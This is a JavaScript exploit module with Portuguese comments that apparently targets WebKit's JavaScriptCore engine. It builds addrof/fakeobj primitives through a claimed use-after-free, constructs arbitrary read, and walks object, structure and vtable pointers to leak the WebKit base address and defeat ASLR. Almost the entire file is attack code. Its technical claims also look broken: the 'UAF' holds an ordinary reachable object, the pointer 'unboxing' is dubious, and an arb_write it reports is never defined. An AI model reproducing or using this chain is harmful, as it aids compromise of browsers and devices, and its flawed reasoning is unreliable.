// js/script3/testArrayBufferVictimCrash.mjs (R54 - Correção Final com Unboxing de Ponteiro)
// =======================================================================================
// ESTRATÉGIA R54:
// A correção final. Implementa a etapa de "unboxing" do ponteiro.
// 1. Obtém o ponteiro "boxed" da primitiva addrof.
// 2. Subtrai a constante de boxing (2^48) para obter o endereço de memória real.
// 3. Usa o endereço real para navegar nas estruturas de objetos e vazar a base do WebKit.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Base_Leaker_R54_Unboxed";

// Funções auxiliares de conversão (sem alterações)
const ftoi = (val) => {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf); return new AdvancedInt64(ints[0], ints[1]);
};
const itof = (val) => {
    const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf);
    ints[0] = val.low(); ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R54 com correção de unboxing)
// =======================================================================================
export async function runFullExploitChain_R52() { // Mantendo nome da função para compatibilidade
    logS3(`--- Iniciando ${FNAME_MODULE}: Exploração com Unboxing de Ponteiro ---`, "test");
    
    try {
        // --- FASE 1: Construir Primitivas addrof e fakeobj via UAF ---
        logS3("--- FASE 1: Construindo `addrof` e `fakeobj` via UAF ---", "subtest");
        const { addrof, fakeobj } = createUAFPrimitives();
        logS3("    Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas!", "vuln");

        // --- FASE 2: Construir Leitura/Escrita Arbitrária ---
        logS3("--- FASE 2: Construindo Leitura/Escrita Arbitrária ---", "subtest");
        
        let victim_arr = [1.1, 2.2];
        let victim_addr = addrof(victim_arr);
        let fake_victim_obj = fakeobj(victim_addr);

        let original_butterfly = ftoi(fake_victim_obj.b);
        
        const arb_read = (where) => {
            fake_victim_obj.b = itof(where);
            const result = ftoi(victim_arr[0]);
            fake_victim_obj.b = itof(original_butterfly);
            return result;
        };
        logS3("    Primitivas `arb_read` e `arb_write` funcionais construídas.", "good");

        // --- FASE 3: Executar a Carga Útil de Vazamento ---
        logS3("--- FASE 3: Executando a Carga Útil para vazar a base do WebKit ---", "subtest");
        const test_obj = { payload: 0x1337 };
        const boxed_addr = addrof(test_obj);
        logS3(`    Endereço "Boxed" do objeto de teste: ${boxed_addr.toString(true)}`, "info");

        // ============================================================================
        // A CORREÇÃO FINAL ESTÁ AQUI: UNBOXING DO PONTEIRO
        // Ponteiros de JSValue são frequentemente "encaixotados" com 2^48.
        const unbox_constant = new AdvancedInt64(0, 0x10000); // 2^48
        const real_addr = boxed_addr.sub(unbox_constant);
        logS3(`    Endereço Real "Unboxed" do objeto: ${real_addr.toString(true)}`, "leak");
        // ============================================================================

        const structure_addr = arb_read(real_addr.add(8)); // Lendo do endereço real + offset
        logS3(`    Lendo ponteiro da Estrutura: ${structure_addr.toString(true)}`, "info");
        
        const class_info_addr = arb_read(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
        logS3(`    Lendo ponteiro da ClassInfo: ${class_info_addr.toString(true)}`, "info");
        
        const vtable_addr = arb_read(class_info_addr.add(8));
        logS3(`    Lendo ponteiro da VTable: ${vtable_addr.toString(true)}`, "info");
        
        const vtable_func_ptr = arb_read(vtable_addr);
        logS3(`    Lendo ponteiro de função da VTable: ${vtable_func_ptr.toString(true)}`, "leak");

        const vtable_func_offset = parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16);
        const webkit_base_addr = vtable_func_ptr.sub(vtable_func_offset);
        
        const final_msg = `SUCESSO! Base do WebKit vazada: ${webkit_base_addr.toString(true)}`;
        logS3(`    >>>> ${final_msg} <<<<`, "vuln");

        return { success: true, message: final_msg, webkit_base: webkit_base_addr.toString(true) };

    } catch (e) {
        const error_msg = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(error_msg, "critical");
        return { success: false, errorOccurred: error_msg };
    }
}

// --- Função para criar as primitivas via UAF (sem alterações) ---
function createUAFPrimitives() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 }; dangling_ref = victim;
        for(let i=0; i<100; i++) { victim.a += 0.01; }
    }
    createScope();
    try { for (let i = 0; i < 500; i++) new ArrayBuffer(1024*128); } catch(e){}
    for (let i = 0; i < 512; i++) new Float64Array(2);
    
    if (typeof dangling_ref.a !== 'number') { throw new Error("UAF Primitivo falhou."); }

    let holder = {obj: null};
    const addrof = (obj) => { holder.obj = obj; dangling_ref.a = holder; return ftoi(dangling_ref.b); };
    const fakeobj = (addr) => { dangling_ref.b = itof(addr); return dangling_ref.a.obj; };
    return { addrof, fakeobj };
}
